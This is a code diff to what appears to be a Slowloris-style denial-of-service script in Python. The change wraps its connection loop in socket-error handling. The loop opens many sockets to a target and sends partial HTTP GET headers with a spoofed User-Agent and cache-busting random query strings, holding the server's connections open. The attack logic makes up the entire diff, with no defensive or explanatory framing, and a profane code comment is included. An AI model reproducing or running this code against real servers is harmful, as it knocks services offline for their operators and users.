@@ -106,40 +106,43 @@ def doconnections():
 					pass
 					# God damn it, get on with it already! Dumb fucking moron.
 
-				if sock[i].connect_ex((args.host, args.port)) == 0:
-					working[i] = 1
-					packetcount += 3
-				
-				if working[i]:
-					if args.cache:
-						rand = "?" + str(random.randint(0, 99999999999999))
-					else:
-						rand = ""
-
-					primarypayload = "GET /" + rand + " HTTP/1.1\r\n"
-					primarypayload += "Host: " + sendhost + "\r\n"
-					primarypayload += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
-					primarypayload += "Content-Length: 42\r\n"
-
-					handle = sock[i]
+				try:
+					if sock[i].connect_ex((args.host, args.port)) == 0:
+						working[i] = 1
+						packetcount += 3
 					
-					if handle:
-						try:
-							handle.send(primarypayload.encode("utf-8"))
-							packetcount += 1
-						except socket.error:
+					if working[i]:
+						if args.cache:
+							rand = "?" + str(random.randint(0, 99999999999999))
+						else:
+							rand = ""
+
+						primarypayload = "GET /" + rand + " HTTP/1.1\r\n"
+						primarypayload += "Host: " + sendhost + "\r\n"
+						primarypayload += "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
+						primarypayload += "Content-Length: 42\r\n"
+
+						handle = sock[i]
+						
+						if handle:
+							try:
+								handle.send(primarypayload.encode("utf-8"))
+								packetcount += 1
+							except socket.error:
+								working[i] = 0
+								handle.close()
+								failed += 1
+								failedconnections += 1
+						else:
 							working[i] = 0
-							handle.close()
 							failed += 1
 							failedconnections += 1
 					else:
 						working[i] = 0
 						failed += 1
 						failedconnections += 1
-				else:
-					working[i] = 0
-					failed += 1
-					failedconnections += 1
+				except socket.error:
+					pass
 
 		print("\t\tSending data.")
 		for i in range(50):
